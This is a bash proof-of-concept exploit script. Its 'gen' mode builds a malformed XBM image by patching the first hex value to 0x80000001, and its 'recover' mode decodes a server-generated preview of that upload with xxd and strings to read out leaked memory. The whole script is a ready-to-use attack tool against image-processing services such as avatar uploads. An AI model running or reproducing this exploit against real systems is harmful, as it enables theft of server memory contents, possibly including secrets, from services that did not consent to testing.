#!/bin/bash

help() {
  echo "Usage poc generator: `basename $0` gen WIDTHxHEIGHT NAME.xbm [minimal]"
  echo "  Example gen: `basename $0` gen 512x512 poc.xbm"
  echo "Usage result recovery: `basename $0` recover SAVED_PREVIEW.png|jpeg|gif|etc"
  echo "  Example recovery: `basename $0` recover avatar.png"
}
if [ "$1" == "-h" ]; then
  help;
  exit 0
fi
if [ "$1" == "gen" ]; then
  echo "Generating..."
  convert -size $2 xc:white $3
  sed -i '0,/0x../s//0x80000001/' $3
  if [ "$4" == "minimal" ]; then
    echo "Shrink to minimal body size mode"
    sed -i 's/0x00//g' $3
    sed -i 's/,//g' $3
    sed -i '/^\s*$/d' $3
  fi
  echo "Done"
  exit 0
fi
if [ "$1" == "recover" ]; then
  convert $2 temp.xbm
  cat temp.xbm | grep -o '0x..' | xxd -r -p | strings -3
  rm temp.xbm
  exit 0
fi
help;
